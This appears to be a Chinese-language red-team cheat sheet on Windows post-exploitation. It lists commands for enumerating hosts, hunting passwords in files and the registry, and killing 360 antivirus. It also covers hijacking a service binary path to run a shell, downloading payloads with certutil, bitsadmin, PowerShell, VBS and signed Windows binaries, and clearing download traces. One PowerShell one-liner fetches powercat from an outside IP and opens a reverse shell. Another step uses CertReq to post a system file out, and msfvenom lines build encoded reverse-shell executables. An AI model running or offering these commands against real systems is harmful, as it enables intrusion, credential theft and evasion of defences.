<h5 id="Windwos-Server-2012-x2F-Windows-7"><a href="#Windwos-Server-2012-x2F-Windows-7" class="headerlink" title="Windwos Server 2012 &#x2F; Windows 7"></a>Windwos Server 2012 &#x2F; Windows 7</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1  </span><br><span class="line">  </span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br></pre></td></tr></table></figure>


<h2 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h2><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net start #查看系统开启的所有服务  </span><br><span class="line">net stop servicename #关闭服务  </span><br><span class="line">net start servicename #开启服务  </span><br></pre></td></tr></table></figure>

<h3 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h3><p>用<code>sc</code>也不是不可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sc qc TermService # 查看某服务的配置信息  </span><br><span class="line">  </span><br><span class="line">sc query ssdpsrv #查看服务状况  </span><br><span class="line">  </span><br><span class="line">sc config ssdpsrv start= &quot;auto&quot; # 将ssdsrv的服务设置为自动运行  </span><br><span class="line">sc config ssdpsrv  obj= &quot;.\LocalSystem&quot; password= &quot;&quot; # 设置obj  </span><br><span class="line">sc config ssdpsrv binpath= &quot;C:\Inetpub\wwwroot\shell.exe&quot; # 修改服务的运行程序  </span><br></pre></td></tr></table></figure>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief # 查看服务列表  </span><br><span class="line">  </span><br><span class="line">powershell -c &quot;Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object &#123;$_.State -like &#x27;Running&#x27;&#125;&quot; # 列出正在运行的服务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_Service</span><br></pre></td></tr></table></figure>

<h2 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a>应用程序</h2><h3 id="自带命令"><a href="#自带命令" class="headerlink" title="自带命令"></a>自带命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRIVERQUERY # 查看已安装驱动程序的列表  </span><br></pre></td></tr></table></figure>

<h3 id="WMI-1"><a href="#WMI-1" class="headerlink" title="WMI"></a>WMI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic product list brief # 查看已安装程序列表  </span><br><span class="line">wmic startup list brief # 查看自启动程序列表</span><br></pre></td></tr></table></figure>
<h2 id="系统进程信息"><a href="#系统进程信息" class="headerlink" title="系统进程信息"></a>系统进程信息</h2><h3 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc #获取运行的进程名，服务，PID   </span><br><span class="line">tasklist /fi &quot;pid eq 123&quot; #查找PID为123的程序  </span><br></pre></td></tr></table></figure>
<h3 id="WMI-2"><a href="#WMI-2" class="headerlink" title="WMI"></a>WMI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief #查看进程列表  </span><br></pre></td></tr></table></figure>

<h3 id="msinfo32"><a href="#msinfo32" class="headerlink" title="msinfo32"></a>msinfo32</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start /wait msinfo32.exe /report c:\windows\temp\list.txt /categoriesswenv+SWEnvRunningTasks #获得更加详细的信息  </span><br><span class="line">  </span><br><span class="line">start /wait msinfo32.exe /report c:\windows\temp\Startup.txt /categories swenv+SWEnvEnvVars #获取环境变量  </span><br><span class="line">  </span><br><span class="line">start /wait msinfo32.exe /report c:\windows\temp\programs.txt /categories swenv+SWEnvStartupPrograms #获取程序组信息（安装的软件信息。  </span><br><span class="line">    </span><br><span class="line">start /wait msinfo32.exe /report c:\windows\temp\Startup.txt /categories swenv+SWEnvStartupPrograms #获取开机自启的信息</span><br></pre></td></tr></table></figure>
<h3 id="结束进程操作"><a href="#结束进程操作" class="headerlink" title="结束进程操作"></a>结束进程操作</h3><h4 id="taskill"><a href="#taskill" class="headerlink" title="taskill"></a>taskill</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TASKKILL [/S system [/U username [/P [password]]]] &#123; [/FI filter] [/PID processid | /IM imagename] &#125; [/F] [/T]  </span><br><span class="line">   </span><br><span class="line">taskill /im 360tray.exe /f #强制关闭360杀毒 /im进程名字 /f强制</span><br></pre></td></tr></table></figure>
<p>taskill通常配合tasklist使用，使用tasklist看完进程id后使用taskill杀死进程。</p>
<h4 id="pskill"><a href="#pskill" class="headerlink" title="pskill"></a>pskill</h4><p>PsTools 的下载地址为:<a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">点我</a>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pskill [-t] [\\computer [-u username [-p password]]] &lt;process ID | name&gt;  </span><br><span class="line">  </span><br><span class="line">pskill PID/name</span><br><span class="line"></span><br><span class="line">pskill和taskill都可以结束其他服务器上的进程。</span><br><span class="line"></span><br><span class="line">wmic process where name=&quot;iexplore.exe&quot; call terminate #结束进程</span><br></pre></td></tr></table></figure>

<h2 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h2><h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo #获取详细的系统信息  </span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;  </span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot;/C:&quot;OS 版本&quot;  </span><br></pre></td></tr></table></figure>
<h3 id="WMIC-1"><a href="#WMIC-1" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn #查看已安装的更新和安装日期  </span><br><span class="line">  </span><br><span class="line">#搜索可以提权的特定漏洞  </span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;  </span><br><span class="line">没有输出就是没有安装  </span><br></pre></td></tr></table></figure>

<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET</span><br></pre></td></tr></table></figure>
<h3 id="hostname-主机名"><a href="#hostname-主机名" class="headerlink" title="hostname-主机名"></a>hostname-主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<h3 id="WMI-powershell"><a href="#WMI-powershell" class="headerlink" title="WMI(powershell)"></a>WMI(powershell)</h3><figure class="highlight plaintext"><figcaption><span>获取系统版本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem  </span><br><span class="line">​  </span><br><span class="line"># 获取域名/主机名  </span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem  </span><br><span class="line">​  </span><br><span class="line"># Bios版本和序列号  </span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_BIOS</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="检索文件"><a href="#检索文件" class="headerlink" title="检索文件"></a>检索文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s password.txt   </span><br><span class="line">dir /b /s *.txt  </span><br><span class="line">dir /b /s *.doc  </span><br><span class="line">dir /b /s *.ppt  </span><br><span class="line">dir /b /s *.xls  </span><br><span class="line">dir /b /s *.docx  </span><br><span class="line">dir /b /s *.xlsx    </span><br><span class="line">dir /b /s config.* filesystem  </span><br><span class="line">findstr /si password *.xml *.ini *.txt findstr /si login *.xml *.ini *.txt  </span><br><span class="line"></span><br><span class="line">dir /b /s *.pfx</span><br></pre></td></tr></table></figure>
<h3 id="无人值守安装日志文件（有包含Base64编码的密码"><a href="#无人值守安装日志文件（有包含Base64编码的密码" class="headerlink" title="无人值守安装日志文件（有包含Base64编码的密码"></a>无人值守安装日志文件（有包含Base64编码的密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\sysprep.inf  </span><br><span class="line">C:\sysprep\sysprep.xml  </span><br><span class="line">C:\Windows\Panther\Unattend\Unattended.xml C:\Windows\Panther\Unattended.xml</span><br></pre></td></tr></table></figure>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for /d %i in (d:\www\*) do @echo %i #列出d:\www下的所有目录  </span><br><span class="line">  </span><br><span class="line">for /d %i in (???) do @echo %i # 在当前路径下匹配只有1-3个字母的文件夹  </span><br><span class="line">  </span><br><span class="line">for /r %i in (*.exe) do @echo %i #列出当前目录和子目录下的exe文件  </span><br><span class="line"></span><br><span class="line">for /r %i in (*.ps1) do @echo %i #列出当前目录和子目录下的exe文件  </span><br><span class="line">  </span><br><span class="line">for /r &quot;f:\test\web\&quot; %i in (*.*) do @echo %i #以指定目录为搜索路径，把当前目录及子目录中的所有文件列出  </span><br><span class="line">  </span><br><span class="line">for /f %i in (c:\1.txt) do echo %i #读取1.txt的文件内容  </span><br><span class="line">  </span><br><span class="line">rar a -k -r -s -m3 c:\1.rar d:\wwwroor # rar打包网站目录  </span><br><span class="line">  </span><br><span class="line">c:/php/php.exe &quot;C:/www/admin/1.php&quot; # php读文件？</span><br></pre></td></tr></table></figure>

<h2 id="磁盘信息"><a href="#磁盘信息" class="headerlink" title="磁盘信息"></a>磁盘信息</h2><p>获取挂载磁盘的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmic logicaldisk where DriveType=3 get DeviceID  ## 简单看看盘符 DriveType=3是本地硬盘  </span><br><span class="line">  </span><br><span class="line">Wmic logicaldisk ## 详细</span><br></pre></td></tr></table></figure>
<h4 id="mountvol"><a href="#mountvol" class="headerlink" title="mountvol"></a>mountvol</h4><p><img src="https://images.atsud0.me/images/post/20210414-22:20:55-_4Eh8MO_4Eh8MO_4Eh8MO_rkxKwp.png" alt="20210414-22:20:55-_4Eh8MO_4Eh8MO_4Eh8MO_rkxKwp"></p>
<h2 id="第三方驱动"><a href="#第三方驱动" class="headerlink" title="第三方驱动"></a>第三方驱动</h2><p>搜索所有驱动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">driverquery /v</span><br><span class="line"></span><br><span class="line">driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis play Name’, ‘Start Mode’, Path</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/20210414-22:29:55-_310uAN_310uAN_310uAN_5wFXj2.png" alt="20210414-22:29:55-_310uAN_310uAN_310uAN_5wFXj2"><br>加个<code>findstr</code>能精确搜索指定的启动模式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis play Name’, ‘Start Mode’, Path | findstr System</span><br></pre></td></tr></table></figure>
<p>也可以用wmi方法来列出所有驱动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer</span><br></pre></td></tr></table></figure>
<p>搜索指定的驱动名字。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer|Where-Object &#123;$_.DeviceName -like &quot;*VMware*&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20210414-22:32:29-_ivldNy_ivldNy_ivldNy_SAyhjF.png" alt="20210414-22:32:29-_ivldNy_ivldNy_ivldNy_SAyhjF"></p>
<h2 id="注册表关键字搜索"><a href="#注册表关键字搜索" class="headerlink" title="注册表关键字搜索"></a>注册表关键字搜索</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM /f KEYWORD /t REG_SZ /s  </span><br><span class="line">reg query HKLM /f password /t REG_SZ /s  </span><br><span class="line">reg query HKCU /f vnc /t REG_SZ /s</span><br></pre></td></tr></table></figure>
<h3 id="搜索特殊关键字注册表"><a href="#搜索特殊关键字注册表" class="headerlink" title="搜索特殊关键字注册表"></a>搜索特殊关键字注册表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  </span><br><span class="line">  </span><br><span class="line">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><br></pre></td></tr></table></figure>
<h2 id="文件权限查询"><a href="#文件权限查询" class="headerlink" title="文件权限查询"></a>文件权限查询</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cacls c:\ #查看权限  </span><br><span class="line">caccls c:\windows\cmd.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用<code>icacls</code>也可以</p>
<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks</span><br></pre></td></tr></table></figure>

<h2 id="下载文件操作"><a href="#下载文件操作" class="headerlink" title="下载文件操作"></a>下载文件操作</h2><p>下载文件操作分为<code>LOLBins（Living off the land Binaries）</code>下载方式和常规的文件下载方式。</p>
<h3 id="常规下载"><a href="#常规下载" class="headerlink" title="常规下载"></a>常规下载</h3><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># bitsadmin Windos7以上可用(<span class="number">360</span>安全大脑会拦截)</span><br><span class="line">bitsadmin /transfern http://www.antian365.com/ma.exe d:\ma.exe</span><br><span class="line"></span><br><span class="line">#certutil (<span class="number">360</span>安全大脑会拦截)</span><br><span class="line">certutil -urlcache -split -f  http://ip/winPEAS.exe # 在<span class="built_in">cmd</span>中下载网页上的文件</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://ip/winPEAS.exe delete #清除下载那个文件的缓存。（清除痕迹</span><br><span class="line"></span><br><span class="line">##通过base64编码文件</span><br><span class="line">certutil -encode -f nc64.exe tmp.b64 &amp;&amp; <span class="built_in">cls</span> &amp;&amp; <span class="built_in">findstr</span> /v /c:- tmp.b64</span><br><span class="line"></span><br><span class="line">cat tmp.b64|base64 -d &gt; nc1.exe</span><br><span class="line"></span><br><span class="line">certutil tmp.b64 testnc.exe</span><br></pre></td></tr></table></figure>

<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;Invoke-WebRequest -Uri &#x27;http://ip/shell.exe&#x27; -OutFile &#x27;C:\Windows\Temp\shell.exe&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">powershell <span class="string">&quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://ip:port/chickme.exe&#x27;,&#x27;shell.exe&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## webshell执行（无文件落地执行。；后面接要执行的命令。</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://10.10.14.41:8080/powercat.ps1&#x27;);powercat -c 10.10.14.41 -p 443 -e cmd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 该命令类似于 curl，在终端窗口中输出下载内容。</span></span><br><span class="line">powershell <span class="literal">-c</span> <span class="string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.10.115/a1.ps1&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h4><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">dim</span> xHttp: <span class="keyword">Set</span> xHttp = <span class="built_in">createobject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">dim</span> bStrm: <span class="keyword">Set</span> bStrm = <span class="built_in">createobject</span>(<span class="string">&quot;Adodb.Stream&quot;</span>)</span><br><span class="line">xHttp.Open <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://192.168.179.1/nc.exe&quot;</span>, <span class="literal">False</span></span><br><span class="line">xHttp.Send</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> bStrm</span><br><span class="line">    .type = <span class="number">1</span> <span class="comment">&#x27;//binary</span></span><br><span class="line">    .open</span><br><span class="line">    .write xHttp.responseBody</span><br><span class="line">    .savetofile <span class="string">&quot;C:\Users\Public\nc.exe&quot;</span>, <span class="number">2</span> <span class="comment">&#x27;//overwrite</span></span><br><span class="line"><span class="keyword">end</span> <span class="keyword">with</span></span><br></pre></td></tr></table></figure>

<h3 id="LoLBin-文件下载"><a href="#LoLBin-文件下载" class="headerlink" title="LoLBin 文件下载"></a>LoLBin 文件下载</h3><p>LOLBins,lib,script定义:</p>
<ol>
<li>它是操作系统本身文件，或者是从Microsoft下载的文件。总之它必须带有windows自身签名文件。</li>
<li>由于是windows自身签名文件，所以一般天然带有免杀的属性,能通过很多应用程序的白名单。</li>
<li>它具有APT功能或者一些对我们红队有用的功能。像去年2019年TA505利用LoLbin和新型后门攻击金融行业。</li>
</ol>
<h4 id="IMEWDBLD-exe（仅Windows10或以上可用）"><a href="#IMEWDBLD-exe（仅Windows10或以上可用）" class="headerlink" title="IMEWDBLD.exe（仅Windows10或以上可用）"></a>IMEWDBLD.exe（仅Windows10或以上可用）</h4><p>文件路径为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE </span><br></pre></td></tr></table></figure>
<p>文件下载后路径为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]</span><br></pre></td></tr></table></figure>
<p>查找文件的存储路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /P &quot;%localappdata%\Microsoft\Windows\INetCache&quot; /S /M * /C &quot;cmd /c echo @path&quot;</span><br></pre></td></tr></table></figure>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p>Kali起个Web服务。<br><img src="https://images.atsud0.me/images/post/20210805-11:25:45-_dXNG1g_jAQ3eK_dXNG1g_1628133945802_dXNG1g_jAQ3eK.png" alt="20210805-11:25:45-_dXNG1g_jAQ3eK_dXNG1g_1628133945802_dXNG1g_jAQ3eK"><br>在Windows10下下载文件，会弹出个无法下载字典文件的报错提示，但是可以不用管它。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE http://192.168.179.2/1.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/20210805-11:26:58-_Ds7nP1_17YLXM_Ds7nP1_1628134018310_Ds7nP1_17YLXM.png" alt="20210805-11:26:58-_Ds7nP1_17YLXM_Ds7nP1_1628134018310_Ds7nP1_17YLXM"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles /P &quot;%localappdata%\Microsoft\Windows\INetCache&quot; /S /M * /C &quot;cmd /c echo @path&quot;</span><br></pre></td></tr></table></figure>
<p>因为下载后的位置是随机生成的，所以需要使用for遍历一下准确的下载路径，然后查看内容。<br><img src="https://images.atsud0.me/images/post/20210805-11:30:26-_JnVySd_bbirw2_JnVySd_1628134226311_JnVySd_bbirw2.png" alt="20210805-11:30:26-_JnVySd_bbirw2_JnVySd_1628134226311_JnVySd_bbirw2"></p>
<h4 id="Desktopimgdownldr-exe"><a href="#Desktopimgdownldr-exe" class="headerlink" title="Desktopimgdownldr.exe"></a>Desktopimgdownldr.exe</h4><p>用于设置锁定屏幕或桌面背景图像作为个性化CSP一部分.CSP在WIN10 1703之后引入。用户如果没有用过CSP，那么路径不存在。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\Windows\\Personalization</span><br></pre></td></tr></table></figure>
<p>默认图片下载和存放路径：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\\windows\\Personalization\\LockScreenImage\\LockScreenImage_%random%.jpg</span><br></pre></td></tr></table></figure>
<p>默认用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.exe /  </span><br><span class="line">eventName：randomname</span><br></pre></td></tr></table></figure>
<h4 id="CertReq"><a href="#CertReq" class="headerlink" title="CertReq"></a>CertReq</h4><blockquote>
<p>certreq命令可用于从证书颁发机构（CA）请求证书，从CA检索对先前请求的响应，从.inf文件创建新请求，接受并安装对请求的响应，根据现有的CA证书或请求构造交叉认证或合格的从属请求，并签署交叉认证或合格的从属请求。 原本用于帮助windows进行证书认证。还能够作为上传，下载的重要工具。</p>
</blockquote>
<p>上传：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config https://example.org/ c:\\windows\\win.ini</span><br></pre></td></tr></table></figure>
<p>下载POST请求，并显示内容（支持HTTP与HTTPS）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config https://example.org/ c:\\windows\\win.ini</span><br></pre></td></tr></table></figure>
<p>下载POST请求，并保存到本地（支持HTTP与HTTPS）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt</span><br></pre></td></tr></table></figure>
<p>小文件可以下载，大文件下载会报错。</p>
<h2 id="生成shell-MSF"><a href="#生成shell-MSF" class="headerlink" title="生成shell-MSF"></a>生成shell-MSF</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.10 LPORT=65500 -f exe -o shell.exe  </span><br><span class="line">  </span><br><span class="line">msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=[your_ip] LPORT=[listening_port] -f exe -o [shell_name.exe]</span><br></pre></td></tr></table></figure>


<h2 id="Powershell-相关"><a href="#Powershell-相关" class="headerlink" title="Powershell 相关"></a>Powershell 相关</h2><h3 id="当前powershell是否为64位进程"><a href="#当前powershell是否为64位进程" class="headerlink" title="当前powershell是否为64位进程"></a>当前powershell是否为64位进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Environment]::Is64BitProcess</span><br></pre></td></tr></table></figure>
<h3 id="powershell-历史记录文件"><a href="#powershell-历史记录文件" class="headerlink" title="powershell 历史记录文件"></a>powershell 历史记录文件</h3><p>就像Linux中的bash一样。powershell一样拥有一个类似<code>.bash_history</code>的文件，路径为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200621_113603.jpg"></p>
<h1 id="提权相关操作"><a href="#提权相关操作" class="headerlink" title="提权相关操作"></a>提权相关操作</h1><h2 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows-Exploit-Suggester"></a>Windows-Exploit-Suggester</h2><p>受Linux-Exploit-Suggester启发的提权辅助工具，但是需要Python和xlrd支持。</p>
